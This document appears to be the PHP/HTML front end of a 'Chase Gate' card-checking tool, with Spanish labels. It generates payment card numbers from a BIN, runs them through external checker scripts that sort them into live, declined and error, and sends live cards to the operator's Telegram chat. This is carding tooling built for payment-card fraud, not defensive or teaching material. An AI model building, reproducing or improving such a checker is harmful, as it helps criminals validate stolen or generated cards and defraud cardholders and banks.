<?php $site_page = "Chase Gate"; $path = $_SERVER["DOCUMENT_ROOT"]; include($path."/static/v4/plugins/form/header.php");
require_once $path . "/api/v1.1/core/brain.php";

// Obtener el ID de Telegram del usuario
$user_id = $_SESSION['user_id'];
$stmt = $connection->prepare("SELECT telegram_chat_id FROM breathe_users WHERE id = :user_id");
$stmt->bindParam(':user_id', $user_id, PDO::PARAM_INT);
$stmt->execute();
$telegram_data = $stmt->fetch(PDO::FETCH_ASSOC);
$telegram_chat_id = $telegram_data['telegram_chat_id'] ?? null;
?>
<section class="content">
   <audio id="iniciaSonido">
      <source src="/static/v4/sounds/iniciar.wav" type="audio/wav">
      <source src="/static/v4/sounds/iniciar.mp3" type="audio/mpeg">
   </audio>
   <audio id="detectaLive">
      <source src="/static/v4/sounds/live.mp3" type="audio/mpeg">
   </audio>
   <div class="content__inner">
      <div class="card">
         <div class="card-body">
            <h4 class="card-title"><i class="zwicon-credit-card"></i> Chase Gate <span class="badge-shadow badge-primary">Live <span class="badge-shadow badge-pill badge-light">4</span></span> <span class="badge-shadow badge-danger">Die <span class="badge-shadow badge-pill badge-light">0</span></span></h4>
            <div class="row">
               <input type="hidden" name="csrf_token" id="csrf_token" value="" />
               <div class="col-md-3">
                  <div class="row">
                     <div class="col-sm-12">
                        <div class="input-group mb-3">
                           <div class="input-group-prepend">
                              <span class="input-group-text"><i class="zwicon-credit-card"></i>&nbsp;BIN</span>
                           </div>
                           <input type="text" class="form-control" id="bin" placeholder="415233055156856034">
                        </div>
                     </div>
                  </div>
                  <div class="row">
                     <div class="col-sm-12">
                        <div class="input-group mb-3">
                           <div class="input-group-prepend">
                              <span class="input-group-text"><i class="zwicon-calendar"></i>&nbsp;Mes</span>
                           </div>
                           <input type="text" class="form-control" id="mes" placeholder="02">
                        </div>
                     </div>
                  </div>
                  <div class="row">
                     <div class="col-sm-12">
                        <div class="input-group mb-3">
                           <div class="input-group-prepend">
                              <span class="input-group-text"><i class="zwicon-calendar"></i>&nbsp;Año</span>
                           </div>
                           <input type="text" class="form-control" id="anio" placeholder="2019">
                        </div>
                     </div>
                  </div>
                  <div class="row">
                     <div class="col-sm-12">
                        <div class="input-group mb-3">
                           <div class="input-group-prepend">
                              <span class="input-group-text"><i class="zwicon-lock"></i>&nbsp;CVC</span>
                           </div>
                           <input type="text" class="form-control" id="cvc" placeholder="227">
                        </div>
                     </div>
                  </div>
                  <div class="row">
                     <div class="col-sm-12">
                        <div class="input-group mb-3">
                           <div class="input-group-prepend">
                              <span class="input-group-text"><i class="zwicon-hash"></i>&nbsp;Cantidad</span>
                           </div>
                           <input type="text" class="form-control" id="cantidad" placeholder="100">
                        </div>
                     </div>
                  </div>
                  <div class="row">
                     <div class="col-sm-12">
                        <button type="button" class="btn btn-theme btn-sm btn--icon-text" onclick="genCC()">
                           <i class="fas fa-magic"></i> Generate Cards
                        </button>
                     </div>
                  </div>
               </div>
               <div class="col-md-9">
                  <div class="row">
                     <div class="col-sm-12">
                        <div class="input-group mb-3">
                           <textarea class="form-control" id="result" rows="10" placeholder="415233055156856034|02|2019|227"></textarea>
                        </div>
                     </div>
                  </div>
                  <div class="custom-control custom-checkbox mb-2">
                     <input type="checkbox" class="custom-control-input" id="telegramToggle">
                     <label class="custom-control-label" for="telegramToggle">Notificar Lives a Telegram</label>
                  </div>
               </div>
            </div>
            <div class="row">
               <div class="col-md-12">
                  <div class="d-flex flex-wrap justify-content-center mb-2" style="gap: 6px;">
                     <button type="button" id="chk-start" class="btn btn-theme btn-sm btn--icon-text" style="min-width: 100px; background:#111; color:#fff; border:none;"> <i class="fas fa-play"></i> Iniciar</button>
                     <button type="button" id="chk-pause" class="btn btn-theme btn-sm btn--icon-text" style="min-width: 80px; background:#111; color:#fff; border:none;"> <i class="fas fa-pause"></i> Pausar</button>
                     <button type="button" id="chk-stop" class="btn btn-theme btn-sm btn--icon-text" style="min-width: 80px; background:#111; color:#fff; border:none;"> <i class="fas fa-stop"></i> Detener</button>
                  </div>
                  <div class="text-center" style="font-size: 13px;">
                     Total: <span id="total" class="badge badge-info">0</span> |
                     Tested: <span id="checked" class="badge badge-warning">0</span> |
                     Lives: <span id="livestat" class="badge badge-primary">0</span> |
                     Decline: <span id="diestat" class="badge badge-danger">0</span> |
                     Errors: <span id="errorstat" class="badge badge-secondary">0</span>
                  </div>
               </div>
            </div>
            <br>
            <div class="row">
               <div class="col-md-12">
                  <div id="loader" style="display: none;">
                     <div id="loader">
                        <img src="/static/v4/img/loading2.gif" style="width:30px; height: 30px;" />
                     </div>
                  </div>
               </div>
               <div class="col-md-12">
                  <div class="cyberpunk-panel" id="barra_porcentaje">
                     <div class="holographic-display">
                        <div class="status-indicator">
                           <div class="neon-circle"></div>
                           <span class="status-text" id="porcentaje">CHASE GATE ONLINE</span>
                        </div>
                        <div class="glitch-effect"></div>
                        <div class="scan-lines"></div>
                     </div>
                  </div>
               </div>
               <div class="col-md-12">
                  <div class="note note-white">
                     <div class="note-content">
                        <h5><b>Estado:</b></h5>
                        <div id="estatus" class="badge badge-info">Waiting...</div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div id="state_seccion" class="card" data-sortable-id="ui-widget-11">
         <div class="card-body">
            <div class="panel-heading">
               <h4 class="panel-title">
                  <b>Lives</b> 
                  <div class="val-lives btn btn-sm btn-icon btn-circle btn-inverse">0</div>
               </h4>
            </div>
            <div id="lives" class="table-responsive" style="max-height: 300px; overflow-y: auto;"></div>
         </div>
      </div>
      <div class="card" data-sortable-id="ui-widget-11">
         <div class="card-body">
            <div class="panel-heading">
               <h4 class="panel-title">
                  <b>Decline</b> 
                  <div class="val-dies btn btn-sm btn-icon btn-circle btn-inverse">0</div>
               </h4>
            </div>
            <div id="dies" class="table-responsive" style="max-height: 300px; overflow-y: auto;"></div>
         </div>
      </div>
      <div class="card" data-sortable-id="ui-widget-11">
         <div class="card-body">
            <div class="panel-heading">
               <h4 class="panel-title">
                  <b>Errors</b> 
                  <div class="val-errors btn btn-sm btn-icon btn-circle btn-inverse">0</div>
               </h4>
            </div>
            <div id="errors" class="table-responsive" style="max-height: 300px; overflow-y: auto;"></div>
         </div>
      </div>
   </div>
</section>
</main>

<script src="/static/v4/js/generar.js"></script>
<script src="/static/v4/js/chk.js"></script>
<script src="/static/v4/js/chase.js"></script>

<script>
// Función para enviar notificación a Telegram
function sendTelegramNotification(card, response) {
    const telegramChatId = '<?php echo $telegram_chat_id; ?>';
    if (!telegramChatId) {
        console.log('No hay ID de Telegram configurado');
        return;
    }

    const data = {
        card: card,
        gate: 'chase',
        response: '✅ VIVA'
    };

    console.log('Enviando notificación:', data);

    fetch('/gates/inc/telegram.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Respuesta del servidor:', data);
        if (data.ok) {
            console.log('Notificación enviada correctamente');
        } else {
            console.error('Error al enviar:', data);
        }
    })
    .catch(error => {
        console.error('Error en la petición:', error);
    });
}

// Modificar la función que maneja las cards Live
document.addEventListener('DOMContentLoaded', function() {
    const originalAddLive = window.addLive;
    
    window.addLive = function(card, response) {
        console.log('Card Live detectada:', card);
        originalAddLive(card);
        sendTelegramNotification(card, response);
    };
});
</script>

</body>
</html>

